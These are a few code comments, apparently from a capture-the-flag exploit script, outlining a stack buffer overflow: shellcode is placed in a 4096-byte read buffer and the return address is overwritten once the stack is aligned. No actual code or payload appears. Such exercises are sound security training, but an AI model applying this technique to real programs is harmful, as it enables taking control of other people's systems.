# the program takes two strings in input.
# It then only the first 20 bytes are kept for both strings
# then concatenate them with a space in betwee.
# the read buffer is 4096 bytes wide, so we store there
# our shellcode.
# next, we tried to overflow the return address of puts.
# Once the stack got aligned (%8), it worked :)
